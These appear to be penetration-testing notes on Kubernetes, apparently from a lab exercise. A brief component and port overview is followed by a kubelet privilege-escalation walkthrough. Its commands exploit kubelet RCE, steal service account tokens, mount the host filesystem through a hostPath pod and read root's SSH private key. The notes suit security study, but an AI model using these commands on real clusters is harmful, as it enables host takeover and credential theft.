Kubernetes (TCP/2379, TCP/2380, TCP/6443, TCP/10251, TCP/10252, TCP/10250, TCP/10255)

An open source system to deploy, scale, and manage containerized applications anywhere. The difference with docker is that kubernetes orchestrates containers

How it works

    Kubernetes works by controlling a cluster of machines. and it has two main components

    • Control Plane which acts as the brain of the application. We can find several parts

      • API Server: main interface to Kubernetes (TCP/6443)
      • Scheduler: decides which machine runs each container (TCP/10251)
      • Controller Manager: ensures the system matches the desired state (TCP/10252)
      • etcd: database storing cluster configuration (TCP/2379, 2380)

    • Worker nodes which actually run the containers using nodes

      • Kubelet: API exposed in every node (TCP/10250, 10255)
      • Container runtime: runs containers (Docker, containerd)
      • Kube-proxy: networking for services

Privilege escalation

    We can use scan rce in order to show which pods are vulnerable to RCE.

    kubeletctl -i --server 10.129.10.11 scan rce

    Then we can use the following command to RCE inside a container

    kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx

    Based on the result of that id command we can escalate fruther to access the host system

    First we need to get the Kubernetes service account token and the certificate (ca.crt)from the target server. We can obtain the token by doing

    kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token

    And the certificate by doing

    kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt

    Now that we have both we can check the access rights in the Kubernetes cluster. 

    export token=`cat k8.token`
kubectl --token=$token --certificate-authority=ca.crt -- server=https://10.129.10.11:6443 auth can-i --list

    From that output we should search for the pod permissions. It would be very nice to have get create list permissions over pods

    Now we will create a yaml file that we can use to create a new container and mount the entire file system of the host

    apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true

    Once created, create the pod and check if its running

    kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods

    Then access the container or obtain files

    kubeletctl --server 10.129.10.11 exec "/bin/bash" -p privesc -c privesc
kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
